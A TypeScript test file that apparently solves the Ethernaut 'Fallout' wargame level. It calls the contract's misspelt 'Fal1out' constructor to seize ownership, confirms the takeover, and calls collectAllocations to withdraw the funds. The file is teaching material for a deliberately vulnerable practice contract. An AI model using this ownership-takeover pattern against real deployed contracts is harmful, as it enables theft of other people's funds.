import { expect } from "chai";
import { Contract, ContractTransaction, Signer } from "ethers";
import { TestOptions, setupChallenge, submitLevel } from "./utils";
import { FALLOUT_LEVEL_ADDRESS } from "./constants";

describe("Fallout", () => {
  let eoa: Signer;
  let challenge: Contract;

  before(async () => {
    const contractLevel = FALLOUT_LEVEL_ADDRESS;
    const contractName = "Fallout";
    const options: TestOptions = { contractName };
    ({ eoa, challenge } = await setupChallenge(contractLevel, options));
  });

  it("solves the challenge", async () => {
    // the constructor is misspelt 'Fal1out' allowing anyone to call it and claim ownership
    const tx: ContractTransaction = await challenge.Fal1out();
    await tx.wait();
    // verify we are the owner of contract
    const [owner, eoaAddress] = await Promise.all([
      challenge.owner(),
      eoa.getAddress(),
    ]);
    expect(owner).to.equal(eoaAddress);
    // collect monies
    await challenge.collectAllocations();
  });

  after(async () => {
    expect(await submitLevel(challenge.address), "level not solved").to.be.true;
  });
});
